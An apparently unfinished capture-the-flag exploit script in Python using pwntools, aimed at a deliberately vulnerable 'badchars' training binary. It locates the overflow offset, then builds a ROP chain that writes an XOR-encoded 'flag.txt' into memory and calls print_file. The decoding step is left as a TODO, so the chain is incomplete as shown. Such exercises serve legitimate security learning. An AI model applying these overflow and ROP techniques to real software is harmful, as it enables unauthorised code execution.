from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-gef
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './badchars'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


def find_eip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of RIP at the time of crashing
    pattern = p.corefile.read(p.corefile.rsp, 4)
    rip_offset = cyclic_find(pattern, alphabet='bcdefhijk')
    info('located RIP offset at {a}'.format(a=rip_offset))
    # Return the EIP offset
    return rip_offset


# Pass in pattern_size, get back EIP offset
eip_offset = find_eip(cyclic(100, alphabet='bcdefhijk'))

# Start program
io = start()
info(io.recvline_contains('badchars are'))

# Address of .data section (size=8 bytes)
data_section_address = 0x00601028

# We will pop the string (flag.txt) into r12
# Then pop address of .data section into r13
# NOTE: We don't need r14, r15 - was there a better way to do this? plz let me know :D
pop_r12_r13_r14_r15 = 0x000000000040069c  # pop r12; pop r13; pop r14; pop r15; ret;

# We will then move the string from r12 (flag.txt) into memory location stored in r13
mov_r13_r12 = 0x0000000000400634  # mov qword ptr [r13], r12; ret;

# Needed at the end to get the flag.txt string into RDI where it will be used as param to print_file
pop_rdi = 0x00000000004006a3  # pop rdi; ret;

# Finally we call print file function, passing in the address of the string (flag.txt)
print_file = 0x0000000000400620

# Print out important addresses
info("%#x data_section_address", data_section_address)
info("%#x pop_r12_r13_r14_r15", pop_r12_r13_r14_r15)
info("%#x mov_r13_r12", mov_r13_r12)
info("%#x pop_rdi", pop_rdi)
info("%#x print_file", print_file)

# Since badchars are 'x', 'g', 'a', '.' and are all contained in flag.txt, we need to XOR before storing in memory
value_to_xor_with = 3
xored_string = xor('flag.txt', value_to_xor_with)
info("flag.txt XORd with %d: %s", value_to_xor_with, xored_string)

# Craft payload which injects "flag.txt" into data section of memory
# And calls print_file() with the string memory location
payload = flat(
    asm('nop') * eip_offset,  # Offset - 44 bytes
    pop_r12_r13_r14_r15,  # Pop 4 byte string (1) into r12 and .data location to r13 (2)
    xored_string,  # 1 - Note we can do 8 bytes as 64-bit
    data_section_address,  # 2
    0x00,  # r14 - don't need
    0x00,  # r15 - don't need
    mov_r13_r12,  # Move string from r12 (1) to memory location (2) stored in r13

    # TODO: XOR

    # Pop the data address to RDI and call print_file
    pop_rdi,
    data_section_address,
    print_file
)

# Send the payload to a new copy of the process
io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')

# Get our flag!
flag = io.recv()
success(flag)
